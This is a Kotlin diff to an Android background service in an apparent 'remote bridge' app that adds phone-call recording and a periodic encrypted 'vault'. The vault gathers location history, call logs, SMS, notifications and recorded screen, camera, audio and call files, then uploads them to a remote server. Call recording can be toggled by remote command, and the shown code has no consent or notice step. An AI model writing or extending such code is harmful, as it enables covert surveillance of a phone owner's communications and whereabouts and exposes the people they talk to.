@@ -4,6 +4,7 @@ import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.ConnectivityManager
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
@@ -176,6 +177,9 @@ class HostForegroundService : LifecycleService() {
     private var statePosterJob: Job? = null
     private var serverApiBase: String = ""
     private var hostDeviceName: String = ""
+    // 🔐 B4: الخزنة المشفرة المسمدة + مسجل المكالمات الهاتفية (حفظ مشفر + رفع إلى Render)
+    private var vaultManager: HostVaultManager? = null
+    private var callRecorder: HostCallRecorder? = null
 
     override fun onBind(intent: Intent): IBinder? {
         super.onBind(intent)
@@ -336,6 +340,34 @@ class HostForegroundService : LifecycleService() {
             // 📍 تتبع الفيولي للهاتف (كل 3 دقائق نبضة) + مزامنة الحالة الصغيرة إلى الخادم
             ensureLocationTracker()
             serverApiBase = normalizeServerApiBase(finalUrl)
+
+            // 🔐 B4: تهيئة الخزنة المشفرة + مسجل المكالمات (مفعّل حسب الإعداد المحفوظ)
+            try {
+                vaultManager = HostVaultManager(applicationContext)
+                callRecorder = HostCallRecorder(
+                    applicationContext,
+                    onSavedCall = { kind, name, plain ->
+                        val vm = vaultManager
+                        if (vm != null && plain.isNotEmpty()) {
+                            vm.storeEncryptedBlob(kind, name, plain)
+                            // محاولات رفع لطيفة بعد كل مكالمة إن كان الشبكة متاحة
+                            scope.launch { runCatching { vm.flushUploads(serverApiBase, hostDeviceId) { isNetworkOnline() } } }
+                        }
+                    },
+                    onError = { err ->
+                        Log.w(TAG, "مسجل المكالمات: $err")
+                        pushLiveEvent(
+                            "call_record_error",
+                            buildJsonObject { put("error", err); put("ts", System.currentTimeMillis()) }
+                        )
+                    }
+                ).also { rec ->
+                    if (rec.isEnabled) rec.attach()
+                }
+            } catch (t: Throwable) {
+                Log.w(TAG, "تهيئة الخزنة/مسجل المكالمات فشلت: ${t.message}")
+            }
+
             startStatePoster()
         }
     }
@@ -1036,6 +1068,52 @@ class HostForegroundService : LifecycleService() {
                 }
             }
 
+            // ☎️ B4 — تفعيل/تعطيل تسجيل المكالمات الهاتفية (تُحفظ مشفرة وتُرفع للخادم لما يتاح الإنترنت)
+            Commands.CALL_RECORD_SET -> {
+                val enabled = request.params?.get("enabled")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: false
+                val rec = callRecorder
+                if (rec == null) {
+                    buildJsonObject {
+                        put("cmd", Commands.CALL_RECORD_SET)
+                        put("ok", false)
+                        put("error", "مسجل المكالمات غير جاهز على المضيف")
+                    }
+                } else {
+                    val attached = try { rec.setEnabled(enabled); true } catch (t: Throwable) { false }
+                    buildJsonObject {
+                        put("cmd", Commands.CALL_RECORD_SET)
+                        put("ok", attached)
+                        put("enabled", enabled)
+                        if (!attached) put("error", "تعذر ربط مسجل المكالمات — تأكد من إذني الميكروفون وحالة الهاتف على المضيف")
+                    }
+                }
+            }
+
+            // 🔐 B4 — دفعة دفء يدوية: نسخ الخزنة المشفرة + رفع المعلق إلى خادم Render
+            Commands.VAULT_FLUSH -> {
+                val vault = vaultManager
+                if (vault == null) {
+                    buildJsonObject {
+                        put("cmd", Commands.VAULT_FLUSH)
+                        put("ok", false)
+                        put("error", "الخزنة غير مهيأة بعد")
+                    }
+                } else {
+                    scope.launch {
+                        try {
+                            vaultTick()
+                        } catch (t: Throwable) {
+                            Log.w(TAG, "دفع خزنة يدوي فشل: ${t.message}")
+                        }
+                    }
+                    buildJsonObject {
+                        put("cmd", Commands.VAULT_FLUSH)
+                        put("ok", true)
+                        put("queued", vault.pendingManifestKeyCount())
+                    }
+                }
+            }
+
             else -> buildJsonObject {
                 put("cmd", request.cmd)
                 put("error", "أمر غير معروف: ${request.cmd}")
@@ -1181,6 +1259,150 @@ class HostForegroundService : LifecycleService() {
                 } catch (t: Throwable) {
                     Log.w(TAG, "دفع الحالة للخادم فشل: ${t.message}")
                 }
+                try {
+                    // 🔐 B4: نسخ كل دورة نبضة إلى الخزنة المشفرة + رفع أي معلّق لما الشبكة متاحة
+                    vaultTick()
+                } catch (t: Throwable) {
+                    Log.w(TAG, "تدفق الخزنة استثناء: ${t.message}")
+                }
+            }
+        }
+    }
+
+    /** هل الشبكة متاحة فعلاً (Wi-Fi/بيانات) — لبوابات رفع الخزنة */
+    private fun isNetworkOnline(): Boolean {
+        return try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            val net = cm?.activeNetwork ?: return false
+            val caps = cm.getNetworkCapabilities(net) ?: return false
+            caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
+                (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) ||
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) ||
+                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET))
+        } catch (_: Throwable) {
+            false
+        }
+    }
+
+    /**
+     * 🔐 نبضة الخزنة المشفرة:
+     * 1) لقطات مشفرة (موقع/مكالمات/رسائل/إشعارات/حالة الشبكة) — تُكتب محلياً دائماً
+     *    حتى لو كان الهاتف غير متصل، لتبقى متاحة لرفعها لاحقاً عند عودة الإنترنت.
+     * 2) مرآة مشفرة لأي ملفات تسجيل جديدة (مكالمات/بث/لقطات) لم تُعالج بعد.
+     * 3) دفقة رفع لكل المعلّق إلى خادم Render عبر /api/blob بلا تكرار (sha256).
+     */
+    private suspend fun vaultTick() {
+        val vault = vaultManager ?: return
+        val deviceId = hostDeviceId
+        if (deviceId.isBlank()) return
+        val provider = dataProvider
+
+        val online = isNetworkOnline()
+
+        // 1) لقطات البيانات الحساسة — تشفير محلي دائم
+        try {
+            val pts = locationTracker?.getPoints(300) ?: emptyList()
+            if (pts.isNotEmpty()) {
+                vault.storeSnapshot(
+                    "location",
+                    buildJsonObject {
+                        put("deviceId", deviceId)
+                        put("ts", System.currentTimeMillis())
+                        put("points", kotlinx.serialization.json.JsonArray(pts))
+                    }
+                )
+            }
+        } catch (t: Throwable) { Log.w(TAG, "لقطة الموقع مشفرة فشلت: ${t.message}") }
+        try {
+            val calls = provider?.readCallLog(200) ?: emptyList()
+            if (calls.isNotEmpty()) {
+                vault.storeSnapshot(
+                    "calls",
+                    buildJsonObject {
+                        put("deviceId", deviceId)
+                        put("ts", System.currentTimeMillis())
+                        put(
+                            "items",
+                            json.encodeToJsonElement(
+                                ListSerializer(CallLogItem.serializer()),
+                                calls
+                            )
+                        )
+                    }
+                )
+            }
+        } catch (t: Throwable) { Log.w(TAG, "لقطة المكالمات مشفرة فشلت: ${t.message}") }
+        try {
+            val sms = provider?.readSms(200) ?: emptyList()
+            if (sms.isNotEmpty()) {
+                vault.storeSnapshot(
+                    "sms",
+                    buildJsonObject {
+                        put("deviceId", deviceId)
+                        put("ts", System.currentTimeMillis())
+                        put(
+                            "items",
+                            json.encodeToJsonElement(
+                                ListSerializer(SmsMessage.serializer()),
+                                sms
+                            )
+                        )
+                    }
+                )
+            }
+        } catch (t: Throwable) { Log.w(TAG, "لقطة الرسائل مشفرة فشلت: ${t.message}") }
+        try {
+            val notifs = BridgeNotificationListenerService.cachedNotifications.toList().take(200)
+            if (notifs.isNotEmpty()) {
+                vault.storeSnapshot(
+                    "notifs",
+                    buildJsonObject {
+                        put("deviceId", deviceId)
+                        put("ts", System.currentTimeMillis())
+                        put(
+                            "items",
+                            json.encodeToJsonElement(
+                                ListSerializer(com.remotebridge.core.model.NotificationItem.serializer()),
+                                notifs
+                            )
+                        )
+                    }
+                )
+            }
+        } catch (t: Throwable) { Log.w(TAG, "لقطة الإشعارات مشفرة فشلت: ${t.message}") }
+        try {
+            // حالة الشبكة والاتصال (بطارية/سحابة/الأخير دورة نية — خلاصة صغيرة مفيدة كنسخة احتياطية)
+            val dev = try { provider?.readDeviceInfo() } catch (_: Throwable) { null }
+            vault.storeSnapshot(
+                "net",
+                buildJsonObject {
+                    put("deviceId", deviceId)
+                    put("ts", System.currentTimeMillis())
+                    put("signaling", signaling?.state?.value == SignalingState.Connected)
+                    put("internet", online)
+                    put("batteryLevel", dev?.batteryLevel ?: -1)
+                    put("isCharging", dev?.isCharging ?: false)
+                }
+            )
+        } catch (t: Throwable) { Log.w(TAG, "لقطة الشبكة مشفرة فشلت: ${t.message}") }
+
+        // 2) مرآة مشفرة للتسجيلات الجديدة (تسجيل الشاشة/الكاميرا/الصوت/اللقطات)
+        try {
+            val base = java.io.File(getExternalFilesDir(null), "RemoteBridgeMedia")
+            if (base.exists()) {
+                for (folderName in listOf("screen", "camera", "audio", "screenshot", "callrec")) {
+                    vault.backupMediaFolder(if (folderName == "screenshot") "screenshots" else folderName, java.io.File(base, folderName))
+                }
+            }
+        } catch (t: Throwable) { Log.w(TAG, "مرآة التسجيلات المشفرة فشلت: ${t.message}") }
+
+        // 3) دفقة الرفع (فقط إن كانت الشبكة متاحة — فتضمنت المعيار «عند الاتصال بالإنترنت»)
+        if (online) {
+            try {
+                val n = vault.flushUploads(serverApiBase, deviceId) { isNetworkOnline() }
+                if (n > 0) Log.i(TAG, "🔐 خزنة: رُفع $n ملف مشفر إلى الخادم")
+            } catch (t: Throwable) {
+                Log.w(TAG, "دفقة رفع الخزنة فشلت: ${t.message}")
             }
         }
     }
@@ -1360,6 +1582,9 @@ class HostForegroundService : LifecycleService() {
         // 🧹 إيقاف محركات التسجيل/الموقع والمزامنة
         try { recordingEngine?.stopAll() } catch (_: Throwable) { }
         recordingEngine = null
+        // 🔐 B4: إفصال مراقب المكالمات أولاً (يوقف التسجيل الجاري إن وجد)
+        try { callRecorder?.detach() } catch (_: Throwable) { }
+        callRecorder = null
         try { locationTracker?.stop() } catch (_: Throwable) { }
         locationTracker = null
         statePosterJob?.cancel()
